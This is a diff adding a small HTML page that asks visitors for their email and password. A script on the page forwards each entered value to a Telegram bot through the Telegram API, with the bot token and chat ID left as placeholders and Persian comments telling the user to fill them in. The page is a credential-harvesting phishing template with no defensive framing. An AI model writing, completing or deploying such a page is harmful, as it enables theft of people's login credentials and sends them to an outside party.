@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="styles.css.css">
+</head>
+<body>
+
+
+    <div class="message-container">
+        <textarea class="message-input" placeholder="Type your email message here..."></textarea>
+        <textarea class="message-input" placeholder="Type your password message here..."></textarea>
+        <button class="send-button">Send Messages</button>
+    </div>
+
+
+
+
+    <script>
+async function sendMessages() {
+    const messages = document.querySelectorAll('.message-input');
+    const chatId = 'your_chat_id_here';  // جایگزین کنید با شناسه چت تلگرام خود
+    const botToken = 'your_bot_token_here';  // جایگزین کنید با توکن بات تلگرام خود
+
+    for (const message of messages) {
+        let formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', message.value);
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+}
+    </script>
+</body>
+</html>
